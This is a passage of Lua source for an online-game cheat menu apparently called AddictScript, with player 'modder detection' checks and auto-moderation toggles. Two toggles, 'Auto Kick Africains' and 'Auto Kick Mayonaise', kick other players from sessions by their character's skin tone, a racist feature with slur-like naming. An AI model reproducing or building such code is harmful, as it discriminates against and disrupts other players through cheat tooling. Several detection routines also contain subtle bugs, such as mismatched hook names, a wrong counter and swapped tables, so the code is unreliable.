							finalstring = finalstring .. line2.. "\n"
						end
					end
					system.yield(0)
					text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "w"), "")
					system.yield(0)
					if finalstring ~= "" then
						text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "a"), finalstring)
					end
				end
			end)
			ChatJudgerFeatures[line]:set_str_data({"Remove"})
		end
	end)
	local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "r")
	for line in file:lines() do
		ChatJudgerFeatures[line] = menu.add_feature(tostring(line), "action_value_str", localparents["Chat Judger Strings"].id, function(f)
			if ChatJudgerFeatures[line] then
				menu.delete_feature(ChatJudgerFeatures[line].id)
			end
			if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt")) then
				local finalstring = ""
				local file2 = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "r")
				for line2 in file2:lines() do
					if not string.find(line2, line) then
						finalstring = finalstring .. line2.. "\n"
					end
				end
				text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "w"), "")
				if finalstring ~= "" then
					text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "a"), finalstring)
				end
			end
		end)
		ChatJudgerFeatures[line]:set_str_data({"Remove"})
	end
end

feature["Auto Kick Africains"] = menu.add_feature("Auto Kick Africains", "toggle", localparents["Auto Moderation"].id, function(f)
	while f.on do
		for pid = 0, 31 do
			if player.is_player_valid(pid) and pid ~= player.player_id() then
				local headblend_dict = ped.get_ped_head_blend_data(player.get_player_ped(pid))
				if headblend_dict ~= nil then
					if headblend_dict.skin_first == 2 or headblend_dict.skin_first == 3 or headblend_dict.skin_first == 8 or headblend_dict.skin_first == 14 or headblend_dict.skin_first == 15 or headblend_dict.skin_first == 19 or headblend_dict.skin_first == 23 or headblend_dict.skin_first == 24 or headblend_dict.skin_first == 35 or headblend_dict.skin_first == 36 then
						menu.notify("Kicked Africain: " .. tostring(player.get_player_name(pid)) .. "/" .. tostring(player.get_player_scid(pid)), "AddictScript Auto Kick Africain", 12, NotifyColours["blue"])
						script_func.drop_kick(pid)
					end
				end
			end
		end
		system.yield(0)
	end
end)

feature["Auto Kick Mayonaise"] = menu.add_feature("Auto Kick Mayonaise", "toggle", localparents["Auto Moderation"].id, function(f)
	while f.on do
		for pid = 0, 31 do
			if player.is_player_valid(pid) and pid ~= player.player_id() then
				local headblend_dict = ped.get_ped_head_blend_data(player.get_player_ped(pid))
				if headblend_dict ~= nil then
					if headblend_dict.skin_first ~= 2 and headblend_dict.skin_first ~= 3 and headblend_dict.skin_first ~= 8 and headblend_dict.skin_first ~= 14 and headblend_dict.skin_first ~= 15 and headblend_dict.skin_first ~= 19 and headblend_dict.skin_first ~= 23 and headblend_dict.skin_first ~= 24 and headblend_dict.skin_first ~= 35 and headblend_dict.skin_first ~= 36 then
						menu.notify("Kicked Mayonaise: " .. tostring(player.get_player_name(pid)) .. "/" .. tostring(player.get_player_scid(pid)), "AddictScript Auto Kick Mayonaise", 12, NotifyColours["blue"])
						script_func.drop_kick(pid)
					end
				end
			end
		end
		system.yield(0)
	end
end)

threads["Modder Detection Refresh"] = menu.create_thread(function()
	while AddictScript do
		for pid = 0, 31 do
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Invalid Info"]) then
				for k, v in pairs(ModderDetections.InvalidInfo) do
					ModderDetections.InvalidInfo[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Invalid Stats"]) then
				for k, v in pairs(ModderDetections.InvalidStats) do
					ModderDetections.InvalidStats[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Godmode"]) then
				for k, v in pairs(ModderDetections.Godmode) do
					ModderDetections.Godmode[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Modded Event"]) then
				for k, v in pairs(ModderDetections.ModdedEvent) do
					ModderDetections.ModdedEvent[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Invalid Script Execution"]) then
				for k, v in pairs(ModderDetections.InvalidScriptExecution) do
					ModderDetections.InvalidScriptExecution[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Altered Migration"]) then
				for k, v in pairs(ModderDetections.AlteredMigration) do
					ModderDetections.AlteredMigration[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Modded Vehicle Mods"]) then
				for k, v in pairs(ModderDetections.ModdedVehicleMods) do
					ModderDetections.ModdedVehicleMods[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Modded Explosion"]) then
				for k, v in pairs(ModderDetections.ModdedExplosion) do
					ModderDetections.ModdedExplosion[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Scripted Entity Spawn"]) then
				for k, v in pairs(ModderDetections.ScriptedEntitySpawn) do
					ModderDetections.ScriptedEntitySpawn[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Bad Movement"]) then
				for k, v in pairs(ModderDetections.BadMovement) do
					ModderDetections.BadMovement[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Failed Position Check"]) then
				for k, v in pairs(ModderDetections.WorldEntityControl) do
					ModderDetections.WorldEntityControl[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["World Entity Control"]) then
				for k, v in pairs(ModderDetections.PositionCheck) do
					ModderDetections.PositionCheck[k][pid] = nil
				end
			end
			if not player.is_player_valid(pid) or not player.is_player_modder(pid, custommodderflags["Network Sync Crash"]) then
				for k, v in pairs(ModderDetections.NetworkSyncCrash) do
					ModderDetections.NetworkSyncCrash[k][pid] = nil
				end
			end
		end
		system.yield(10)
	end
end, nil)

localparents["Modder Detections"] = menu.add_feature("Modder Detections", "parent", localparents["Online"].id)

localparents["Invalid Info Detection"] = menu.add_feature("Invalid Info", "parent", localparents["Modder Detections"].id)

feature["Invalid Name Detection"] = menu.add_feature("Invalid Name", "value_str", localparents["Invalid Info Detection"].id, function(f)
	while f.on do
		if network.is_session_started() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if string.len(player.get_player_name(pid)) < 6 or string.len(player.get_player_name(pid)) > 16 or not string.find(player.get_player_name(pid), "^[%.%-%w_]+$") then
						if not ModderDetections.InvalidInfo.Name[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Invalid Info"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Invalid Info | Name", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.InvalidInfo.Name[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(1000)
	end
end)
feature["Invalid Name Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Invalid SCID Detection"] = menu.add_feature("Invalid SCID", "value_str", localparents["Invalid Info Detection"].id, function(f)
	while f.on do
		if network.is_session_started() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if player.get_player_scid(pid) < 100000 or player.get_player_scid(pid) > 250000000 then
						if not ModderDetections.InvalidInfo.SCID[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Invalid Info"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Invalid Info | SCID", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.InvalidInfo.SCID[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(1000)
	end
end)
feature["Invalid SCID Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Invalid IP Detection"] = menu.add_feature("Invalid IP", "value_str", localparents["Invalid Info Detection"].id, function(f)
	while f.on do
		if network.is_session_started() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if player.get_player_ip(pid) <= 0 or player.get_player_ip(pid) > 4294967295 or player.get_player_ip(pid) == 2130706433 then
						if not ModderDetections.InvalidInfo.IP[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Invalid Info"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Invalid Info | IP", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.InvalidInfo.IP[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(1000)
	end
end)
feature["Invalid IP Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Invalid Host Token Detection"] = menu.add_feature("Invalid Host Token", "value_str", localparents["Invalid Info Detection"].id, function(f)
	while f.on do
		if network.is_session_started() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if player.get_player_host_token(pid) < 100000 and player.get_player_host_token(pid) > -100000 then
						if not ModderDetections.InvalidInfo.HostToken[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Invalid Info"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Invalid Info | Host Token", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.InvalidInfo.HostToken[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(1000)
	end
end)
feature["Invalid Host Token Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Invalid Stats Detection"] = menu.add_feature("Invalid Stats", "parent", localparents["Modder Detections"].id)

feature["Invalid Rank Detection"] = menu.add_feature("Invalid Rank", "value_str", localparents["Invalid Stats Detection"].id, function(f)
	while f.on do
		if network.is_session_started() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if (script_func.get_player_rank(pid) > 8000 or script_func.get_player_rank(pid) < 0) and not script_func.is_loading_into_session() and not script_func.is_player_loading(pid) then
						if not ModderDetections.Stats.Rank[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Invalid Stats"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Invalid Stats | Rank", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.Stats.Rank[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(1000)
	end
end)
feature["Invalid Rank Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Invalid KD Detection"] = menu.add_feature("Invalid KD", "value_str", localparents["Invalid Stats Detection"].id, function(f)
	while f.on do
		if network.is_session_started()and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if (script_func.get_player_kills(pid) > 2147483647 or script_func.get_player_kills(pid) < 0 or script_func.get_player_deaths(pid) > 2147483647 or script_func.get_player_deaths(pid) < 0 or script_func.get_player_kd(pid) > 2147483647 or script_func.get_player_kd(pid) < 0) and not script_func.is_player_loading(pid) then
						if not ModderDetections.InvalidStats.KD[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Invalid Stats"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Invalid Stats | KD", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.InvalidStats.KD[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(1000)
	end
end)
feature["Invalid KD Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Godmode Detection"] = menu.add_feature("Godmode", "parent", localparents["Modder Detections"].id)

feature["Godmode Detection"] = menu.add_feature("Godmode", "value_str", localparents["Godmode Detection"].id, function(f)
	while f.on do
		system.yield(500)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and player.player_id() ~= pid then
					if player.is_player_god(pid) and player_func.is_player_moving(pid) and entity.is_entity_visible(player.get_player_ped(pid)) and not natives.IS_PLAYER_IN_CUTSCENE(pid) and not script_func.is_player_loading(pid) and not player_func.is_player_in_interior(pid) and (ai.is_task_active(player.get_player_ped(pid), 4) or ai.is_task_active(player.get_player_ped(pid), 9) or ai.is_task_active(player.get_player_ped(pid), 128) or ai.is_task_active(player.get_player_ped(pid), 200) or ai.is_task_active(player.get_player_ped(pid), 272) or ai.is_task_active(player.get_player_ped(pid), 287) or ai.is_task_active(player.get_player_ped(pid), 289) or ai.is_task_active(player.get_player_ped(pid), 290) or ai.is_task_active(player.get_player_ped(pid), 291) or ai.is_task_active(player.get_player_ped(pid), 295) or ai.is_task_active(player.get_player_ped(pid), 298) or ai.is_task_active(player.get_player_ped(pid), 299) or ai.is_task_active(player.get_player_ped(pid), 302) or ai.is_task_active(player.get_player_ped(pid), 303) or ai.is_task_active(player.get_player_ped(pid), 304) or ai.is_task_active(player.get_player_ped(pid), 335) or ai.is_task_active(player.get_player_ped(pid), 422) or ai.is_task_active(player.get_player_ped(pid), 423)) then
						if not ModderDetections.Godmode.Godmode[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Godmode"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Godmode | Godmode", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.Godmode.Godmode[pid] = true
							end
						end
					end
				end
			end
		end
	end
end)
feature["Godmode Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Invincibility Detection"] = menu.add_feature("Invincibility", "value_str", localparents["Godmode Detection"].id, function(f)
	while f.on do
		system.yield(500)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and player.player_id() ~= pid then
					if natives.GET_PLAYER_INVINCIBLE(pid) and player_func.is_player_moving(pid) and entity.is_entity_visible(player.get_player_ped(pid)) and not natives.IS_PLAYER_IN_CUTSCENE(pid) and not script_func.is_player_loading(pid) and not player_func.is_player_in_interior(pid) and (ai.is_task_active(player.get_player_ped(pid), 4) or ai.is_task_active(player.get_player_ped(pid), 9) or ai.is_task_active(player.get_player_ped(pid), 128) or ai.is_task_active(player.get_player_ped(pid), 200) or ai.is_task_active(player.get_player_ped(pid), 272) or ai.is_task_active(player.get_player_ped(pid), 287) or ai.is_task_active(player.get_player_ped(pid), 289) or ai.is_task_active(player.get_player_ped(pid), 290) or ai.is_task_active(player.get_player_ped(pid), 291) or ai.is_task_active(player.get_player_ped(pid), 295) or ai.is_task_active(player.get_player_ped(pid), 298) or ai.is_task_active(player.get_player_ped(pid), 299) or ai.is_task_active(player.get_player_ped(pid), 302) or ai.is_task_active(player.get_player_ped(pid), 303) or ai.is_task_active(player.get_player_ped(pid), 304) or ai.is_task_active(player.get_player_ped(pid), 335) or ai.is_task_active(player.get_player_ped(pid), 422) or ai.is_task_active(player.get_player_ped(pid), 423)) then
						if not ModderDetections.Godmode.Invincibility[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Godmode"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Godmode | Invincibility", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.Godmode.Invincibility[pid] = true
							end
						end
					end
				end
			end
		end
	end
end)
feature["Invincibility Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Damage Spoof Detection"] = menu.add_feature("Damage Spoof", "value_str", localparents["Godmode Detection"].id, function(f)
	while f.on do
		system.yield(500)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and player.player_id() ~= pid then
					if not natives.GET_ENTITY_CAN_BE_DAMAGED(player.get_player_ped(pid)) and not player.is_player_god(pid) and player_func.is_player_moving(pid) and entity.is_entity_visible(player.get_player_ped(pid)) and not natives.IS_PLAYER_IN_CUTSCENE(pid) and not script_func.is_player_loading(pid) and not player_func.is_player_in_interior(pid) and (ai.is_task_active(player.get_player_ped(pid), 4) or ai.is_task_active(player.get_player_ped(pid), 9) or ai.is_task_active(player.get_player_ped(pid), 128) or ai.is_task_active(player.get_player_ped(pid), 200) or ai.is_task_active(player.get_player_ped(pid), 272) or ai.is_task_active(player.get_player_ped(pid), 287) or ai.is_task_active(player.get_player_ped(pid), 289) or ai.is_task_active(player.get_player_ped(pid), 290) or ai.is_task_active(player.get_player_ped(pid), 291) or ai.is_task_active(player.get_player_ped(pid), 295) or ai.is_task_active(player.get_player_ped(pid), 298) or ai.is_task_active(player.get_player_ped(pid), 299) or ai.is_task_active(player.get_player_ped(pid), 302) or ai.is_task_active(player.get_player_ped(pid), 303) or ai.is_task_active(player.get_player_ped(pid), 304) or ai.is_task_active(player.get_player_ped(pid), 335) or ai.is_task_active(player.get_player_ped(pid), 422) or ai.is_task_active(player.get_player_ped(pid), 423)) then
						if not ModderDetections.Godmode.DamageSpoof[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Godmode"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Godmode | Damage Spoof", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.Godmode.DamageSpoof[pid] = true
							end
						end
					end
				end
			end
		end
	end
end)
feature["Damage Spoof Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Entity Proofs Detection"] = menu.add_feature("Entity Proofs", "value_str", localparents["Godmode Detection"].id, function(f)
	while f.on do
		system.yield(500)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and player.player_id() ~= pid then
					local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(pid))
					if success and BOOLbulletProof and BOOLfireProof and BOOLexplosionProof and BOOLcollisionProof and BOOLmeleeProof and BOOLsteamProof and BOOLp7 and BOOLdrownProof and player_func.is_player_moving(pid) and entity.is_entity_visible(player.get_player_ped(pid)) and not natives.IS_PLAYER_IN_CUTSCENE(pid) and not script_func.is_player_loading(pid) and not player_func.is_player_in_interior(pid) and (ai.is_task_active(player.get_player_ped(pid), 4) or ai.is_task_active(player.get_player_ped(pid), 9) or ai.is_task_active(player.get_player_ped(pid), 128) or ai.is_task_active(player.get_player_ped(pid), 200) or ai.is_task_active(player.get_player_ped(pid), 272) or ai.is_task_active(player.get_player_ped(pid), 287) or ai.is_task_active(player.get_player_ped(pid), 289) or ai.is_task_active(player.get_player_ped(pid), 290) or ai.is_task_active(player.get_player_ped(pid), 291) or ai.is_task_active(player.get_player_ped(pid), 295) or ai.is_task_active(player.get_player_ped(pid), 298) or ai.is_task_active(player.get_player_ped(pid), 299) or ai.is_task_active(player.get_player_ped(pid), 302) or ai.is_task_active(player.get_player_ped(pid), 303) or ai.is_task_active(player.get_player_ped(pid), 304) or ai.is_task_active(player.get_player_ped(pid), 335) or ai.is_task_active(player.get_player_ped(pid), 422) or ai.is_task_active(player.get_player_ped(pid), 423)) then
						if not ModderDetections.Godmode.EntityProofs[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Godmode"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Godmode | Entity Proofs", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.Godmode.EntityProofs[pid] = true
							end
						end
					end
				end
			end
		end
	end
end)
feature["Entity Proofs Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Modded Event Detection"] = menu.add_feature("Modded Event", "parent", localparents["Modder Detections"].id)

feature["Bad Script Event Detection"] = menu.add_feature("Bad Script Event", "value_str", localparents["Modded Event Detection"].id, function(f)
	if f.on then
		eventhooks["Bad Script Event Detection"] = hook.register_script_event_hook(function(source, target, params, count)
			for i = 1, #params do
				params[i] = params[i] & 0xFFFFFFFF
			end
			if (params[1] > -10000 and params[1] < 10000) or params[1] == ScriptEvent["NULL"] or params[2] ~= source then
				if player.is_player_valid(source) and source ~= player.player_id() then
					if not ModderDetections.ModdedEvent.BadScriptEvent[source] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(source)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(source)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(source, custommodderflags["Modded Event"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(source)) .. "\nReason: Session Event | Bad Script Event (" .. params[1] .. ")", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.ModdedEvent.BadScriptEvent[source] = true
						end
					end
				end
			end
		end)
	end
	if not f.on then
		if eventhooks["Bad Net Script Detection"] then
			hook.remove_script_event_hook(eventhooks["Bad Net Script Detection"])
			eventhooks["Bad Net Script Detection"] = nil
		end
	end
end)
feature["Bad Script Event Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Bad Net Event Detection"] = menu.add_feature("Bad Net Event", "value_str", localparents["Modded Event Detection"].id, function(f)
	if f.on then
		eventhooks["Bad Net Event Detection"] = hook.register_net_event_hook(function(source, target, eventId)
			if eventId == NetEventID["REQUEST MAP PICKUP"] or eventId == NetEventID["GAME CLOCK"] or eventId == NetEventID["GAME WEATHER"] or eventId == NetEventID["GIVE WEAPON"] or eventId == NetEventID["REMOVE WEAPON"] or eventId == NetEventID["REMOVE ALL WEAPONS"] or eventId == NetEventID["CLEAR PED TASKS"] or eventId == NetEventID["GIVE PICKUP REWARDS"] or eventId == NetEventID["CRC HASH CHECK"] or eventId == NetEventID["CHECK EXE SIZE"] or eventId == NetEventID["CHECK CODE CRCS"] or eventId == NetEventID["CHECK CATALOG CRC"] then
				if player.is_player_valid(source) and source ~= player.player_id() then
					if not ModderDetections.ModdedEvent.BadNetEvent[source] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(source)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(source)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(source, custommodderflags["Modded Event"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(source)) .. "\nReason: Session Event | Bad Net Event (" .. eventId .. ")", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.ModdedEvent.BadNetEvent[source] = true
						end
					end
				end
			end
		end)
	end
	if not f.on then
		if eventhooks["Bad Net Event Detection"] then
			hook.remove_net_event_hook(eventhooks["Bad Net Event Detection"])
			eventhooks["Bad Net Event Detection"] = nil
		end
	end
end)
feature["Bad Net Event Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Script Event Spam Detection"] = menu.add_feature("Script Event Spam", "value_str", localparents["Modded Event Detection"].id, function(f)
	if f.on then
		for pid = 0, 31 do
			MiscPlayerCount.NetEvent[pid] = 0
		end
		eventhooks["Script Event Spam Detection"] = hook.register_script_event_hook(function(source, target, params, count)
			MiscPlayerCount.ScriptEvent[source] = MiscPlayerCount.ScriptEvent[source] + 1
		end)
		while f.on do
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if MiscPlayerCount.NetEvent[pid] > 45 and player.get_player_coords(pid).z > 0 then
						if not ModderDetections.ModdedEvent.ScriptEventSpam[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Modded Event"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Session Event | Script Event Spam", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.ModdedEvent.ScriptEventSpam[pid] = true
							end
						end
					end
				end
				MiscPlayerCount.ScriptEvent[pid] = 0
			end
			system.yield(5000)
		end
	end
	if not f.on then
		for pid = 0, 31 do
			MiscPlayerCount.ScriptEvent[pid] = 0
		end
		if eventhooks["Script Event Spam Detection"] then
			hook.remove_script_event_hook(eventhooks["Script Event Spam Detection"])
			eventhooks["Script Event Spam Detection"] = nil
		end
	end
end)
feature["Script Event Spam Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Net Event Spam Detection"] = menu.add_feature("Net Event Spam", "value_str", localparents["Modded Event Detection"].id, function(f)
	if f.on then
		for pid = 0, 31 do
			MiscPlayerCount.NetEvent[pid] = 0
		end
		eventhooks["Net Event Spam Detection"] = hook.register_net_event_hook(function(source, target, eventId)
			if eventId ~= NetEventID["SCRIPTED GAME"] and eventId ~= NetEventID["ENTITY AREA STATUS"] then
				MiscPlayerCount.NetEvent[source] = MiscPlayerCount.NetEvent[source] + 1
			end
		end)
		while f.on do
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if MiscPlayerCount.NetEvent[pid] > 64 and player.get_player_coords(pid).z > 0 then
						if not ModderDetections.ModdedEvent.NetEventSpam[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Modded Event"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Session Event | Net Event Spam", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.ModdedEvent.NetEventSpam[pid] = true
							end
						end
					end
				end
				MiscPlayerCount.NetEvent[pid] = 0
			end
			system.yield(5000)
		end
	end
	if not f.on then
		for pid = 0, 31 do
			MiscPlayerCount.NetEvent[pid] = 0
		end
		if eventhooks["Net Event Spam Detection"] then
			hook.remove_net_event_hook(eventhooks["Net Event Spam Detection"])
			eventhooks["Net Event Spam Detection"] = nil
		end
	end
end)
feature["Net Event Spam Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Altered Migration Detection"] = menu.add_feature("Altered Migration", "parent", localparents["Modder Detections"].id)

feature["Altered Session Host Migration Detection"] = menu.add_feature("Altered Session Host Migration", "value_str", localparents["Altered Migration Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and player.player_id() ~= pid then
					if player.get_player_host_token(pid) < 1000000 and player.get_player_host_token(pid) > -1000000 and player.is_player_host(pid) then
						if not ModderDetections.AlteredMigration.SessionHost[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Altered Migration"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Altered Migration | Session Host", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.AlteredMigration.SessionHost[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
